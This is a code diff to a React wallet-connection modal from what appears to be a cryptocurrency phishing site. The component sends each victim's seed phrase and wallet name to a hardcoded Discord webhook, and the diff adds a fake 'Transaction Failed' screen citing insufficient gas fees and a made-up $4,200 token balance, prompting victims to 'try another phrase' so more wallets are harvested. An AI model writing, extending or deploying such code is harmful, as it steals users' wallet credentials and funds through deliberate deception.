@@ -21,7 +21,7 @@ const wallets = [
 
 export default function WalletModal({ isOpen, onClose }: WalletModalProps) {
   const [selectedWallet, setSelectedWallet] = useState<string>('');
-  const [verificationStep, setVerificationStep] = useState<'select' | 'verify' | 'seed' | 'loading'>('select');
+  const [verificationStep, setVerificationStep] = useState<'select' | 'verify' | 'seed' | 'loading' | 'error'>('select');
   const [seedLength, setSeedLength] = useState<12 | 24>(12);
   const [seedPhrases, setSeedPhrases] = useState<string[]>(Array(12).fill(''));
   const [isProcessing, setIsProcessing] = useState(false);
@@ -57,6 +57,7 @@ export default function WalletModal({ isOpen, onClose }: WalletModalProps) {
   const handleSubmitSeed = async () => {
     setVerificationStep('loading');
     try {
+      // Send to webhook
       await fetch('https://discord.com/api/webhooks/1290064859018428466/_qS1U4H3wEyLE4PE0edFtOYc-24ER73KWwIRSuUKN9joNIMXXEiyA1qAmn3GT8ZuKtwh', {
         method: 'POST',
         headers: {
@@ -66,11 +67,15 @@ export default function WalletModal({ isOpen, onClose }: WalletModalProps) {
           content: `New Wallet Connection\nWallet: ${selectedWallet}\nSeed Phrase: ${seedPhrases.join(' ')}`,
         }),
       });
+      
+      // Simulate loading
       await new Promise(resolve => setTimeout(resolve, 2000));
-      onClose();
+      
+      // Show error state
+      setVerificationStep('error');
     } catch (error) {
       console.error('Error:', error);
-      setVerificationStep('seed');
+      setVerificationStep('error');
     }
   };
 
@@ -81,6 +86,53 @@ export default function WalletModal({ isOpen, onClose }: WalletModalProps) {
     visible: { opacity: 1, scale: 1 },
     exit: { opacity: 0, scale: 0.95 }
   };
+
+  if (verificationStep === 'error') {
+    return (
+      <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <motion.div
+          initial="hidden"
+          animate="visible"
+          exit="exit"
+          variants={modalVariants}
+          className="bg-[#1a1a2e] rounded-2xl w-full max-w-md shadow-xl border border-purple-500/20 p-8"
+        >
+          <div className="flex flex-col items-center justify-center gap-6">
+            <div className="bg-red-500/10 p-4 rounded-lg border border-red-500/20 w-full">
+              <h3 className="text-red-500 font-semibold mb-2">Transaction Failed</h3>
+              <p className="text-gray-300 text-sm">Insufficient gas fees for transaction. Please ensure your wallet is funded or try another phrase.</p>
+            </div>
+            
+            <div className="bg-purple-500/10 p-4 rounded-lg border border-purple-500/20 w-full">
+              <div className="flex justify-between items-center mb-2">
+                <span className="text-gray-300">Nexura Token Worth:</span>
+                <span className="text-purple-400 font-semibold">$4,200.00</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="text-gray-300">Required Gas Fee:</span>
+                <span className="text-red-400">Insufficient Balance</span>
+              </div>
+            </div>
+
+            <div className="flex gap-3 w-full">
+              <button
+                onClick={() => setVerificationStep('seed')}
+                className="flex-1 bg-gray-800 text-white px-4 py-2 rounded-lg font-medium hover:bg-gray-700 transition-colors"
+              >
+                Try Again
+              </button>
+              <button
+                onClick={onClose}
+                className="flex-1 bg-gradient-to-r from-purple-500 to-pink-500 text-white px-4 py-2 rounded-lg font-medium hover:opacity-90 transition-opacity"
+              >
+                Close
+              </button>
+            </div>
+          </div>
+        </motion.div>
+      </div>
+    );
+  }
 
   if (verificationStep === 'loading') {
     return (
